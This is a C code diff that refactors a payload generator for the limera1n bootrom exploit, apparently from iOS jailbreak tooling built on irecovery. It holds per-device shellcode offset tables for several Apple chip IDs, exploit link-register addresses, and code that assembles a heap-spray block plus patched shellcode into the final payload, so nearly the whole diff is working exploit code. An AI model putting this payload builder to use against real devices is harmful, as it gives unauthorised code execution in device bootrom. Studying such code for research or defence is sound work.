@@ -85,66 +85,17 @@ const uint32_t payload_data[] = {
     0x2202D7FC  // 0x34: bk - LR on the stack
 };
 
-void* memmem_portable(const void* haystack, size_t haystacklen, const void* needle, size_t needlelen) {
-    if (needlelen == 0 || haystacklen < needlelen) {
-        return NULL;
-    }
-
-    const unsigned char* h = (const unsigned char*)haystack;
-    const unsigned char* n = (const unsigned char*)needle;
-
-    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
-        if (memcmp(h + i, n, needlelen) == 0) {
-            return (void*)(h + i);
-        }
-    }
-
-    return NULL;
-}
-
-int add_payload_offsets(unsigned char* payload, size_t payload_len, uint32_t* offsets, size_t num_offsets) {
-    for (size_t i = 0; i < num_offsets; i++) {
-        uint32_t value = 0xBAD00001 + i;
-        void* ptr = memmem_portable(payload, payload_len, &value, sizeof(uint32_t));
-        if (!ptr) {
-            return -1; // Value not found in payload
-        }
-        *(uint32_t*)ptr = offsets[i];
-    }
-    return 0;
-}
-
-int add_exploit_lr(unsigned char* payload, size_t payload_len, uint32_t* exploit_lr, size_t exploit_lr_len) {
-    uint32_t magic = 0xFEEDFACE;
-    char* ptr;
-
-    for(int i = 0; i < 0x10; i++) {
-        ptr = memmem_portable(payload, payload_len, &magic, sizeof(uint32_t));
-        if(!ptr) {
-            return -1;
-        }
-        memcpy(ptr, exploit_lr, exploit_lr_len);
-    }
-
-    return 0;
-}
-
-int gen_limera1n(irecv_client_t client, unsigned char** payload, size_t* payload_len) {
-    int ret;
+int gen_limera1n(irecv_client_t client, unsigned char **payload, size_t *payload_len) {
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
-    *payload = malloc(limera1n_payload_len);
-    *payload_len = limera1n_payload_len;
-    memcpy(*payload, limera1n_payload, limera1n_payload_len);
 
-    uint32_t* shellcode_constants;
-    size_t shellcode_constants_len;
-    uint32_t* exploit_lr;
-    exploit_lr = malloc(sizeof(uint32_t));
+    const uint32_t *constants = NULL;
+    size_t constants_len = 22;
+    uint32_t exploit_lr = 0;
 
     switch(devinfo->cpid) {
         case 0x8920:
             if(!strcmp(devinfo->srtg, "iBoot-359.3")){ // oldBR
-                shellcode_constants = (uint32_t[22]){
+                static const uint32_t c[] = {
                     0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
                           1024, //#  2 - RELOCATE_SHELLCODE_SIZE
                         0x83d4, //#  3 - memmove
@@ -168,9 +119,9 @@ int gen_limera1n(irecv_client_t client, unsigned char** payload, size_t* payload
                         0x2655, //# 21 - image3_load_continue
                         0x277b, //# 22 - image3_load_fail
                 };
-                shellcode_constants_len = 22;
+                constants = c;
             } else { // newBR
-                shellcode_constants = (uint32_t[22]){
+                static const uint32_t c[] = {
                     0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
                           1024, //#  2 - RELOCATE_SHELLCODE_SIZE
                     0x83dc, //#  3 - memmove
@@ -194,12 +145,12 @@ int gen_limera1n(irecv_client_t client, unsigned char** payload, size_t* payload
                         0x265d, //# 21 - image3_load_continue
                         0x2783, //# 22 - image3_load_fail
                 };
-                shellcode_constants_len = 22;
+                constants = c;
             }
-            *(uint32_t*)exploit_lr = 0x84033FA4;
+            exploit_lr = 0x84033FA4;
             break;
             case 0x8922:
-                shellcode_constants = (uint32_t[22]){
+                static const uint32_t c[] = {
                     0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
                           1024, //#  2 - RELOCATE_SHELLCODE_SIZE
                         0x8564, //#  3 - memmove
@@ -223,11 +174,11 @@ int gen_limera1n(irecv_client_t client, unsigned char** payload, size_t* payload
                         0x2665, //# 21 - image3_load_continue
                         0x276d, //# 22 - image3_load_fail
                 };
-                shellcode_constants_len = 22;
-                *(uint32_t*)exploit_lr = 0x84033F98;
+                constants = c;
+                exploit_lr = 0x84033F98;
                 break;
             case 0x8930:
-                shellcode_constants = (uint32_t[22]){
+                static const uint32_t c[] = {
                     0x84039800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
                           1024, //#  2 - RELOCATE_SHELLCODE_SIZE
                         0x84dc, //#  3 - memmove
@@ -251,25 +202,54 @@ int gen_limera1n(irecv_client_t client, unsigned char** payload, size_t* payload
                         0x46db, //# 21 - image3_load_continue
                         0x47db, //# 22 - image3_load_fail
                 };
-                shellcode_constants_len = 22;
-                *(uint32_t*)exploit_lr = 0x8403BF9C;
+                constants = c;
+                exploit_lr = 0x8403BF9C;
                 break;
             default:
                 printf("no payload offsets are available for this device.\n");
                 return -1;
     }
 
+    size_t shellcode_len = limera1n_shellcode_len;
+    const unsigned char *shellcode = limera1n_shellcode;
 
-    ret = add_payload_offsets(*payload, *payload_len, shellcode_constants, shellcode_constants_len);
-    if(ret != 0) {
-        printf("failed to add offsets to payload.\n");
-        return -1;
+    size_t placeholders_offset = shellcode_len - (4 * constants_len);
+
+    // verify placeholders
+    for (size_t i = 0; i < constants_len; i++) {
+        uint32_t val;
+        memcpy(&val, shellcode + placeholders_offset + (i * 4), 4);
+        if (val != (0xBAD00001 + i)) {
+            printf("placeholder mismatch\n");
+            return -1;
+        }
     }
 
-    ret = add_exploit_lr(*payload, *payload_len, exploit_lr, 4);
-    if(ret != 0) {
-        printf("failed to add exploit_lr to payload.\n");
-        return -1;
+    uint32_t shellcode_address = 0x84000400 + 1;
+
+    unsigned char heap_block[64];
+    uint32_t header[4] = {0x405, 0x101, shellcode_address, exploit_lr};
+
+    memcpy(heap_block, header, 16);
+    memset(heap_block + 16, 0xCC, 48);
+
+    *payload_len = (64 * 16) + placeholders_offset + (4 * constants_len);
+    *payload = malloc(*payload_len);
+    if (!*payload) return -1;
+
+    unsigned char *p = *payload;
+
+    for (int i = 0; i < 16; i++) {
+        memcpy(p, heap_block, 64);
+        p += 64;
+    }
+
+    memcpy(p, shellcode, placeholders_offset);
+    p += placeholders_offset;
+
+    for (size_t i = 0; i < constants_len; i++) {
+        memcpy(p, &constants[i], 4);
+        p += 4;
     }
 
     return 0;
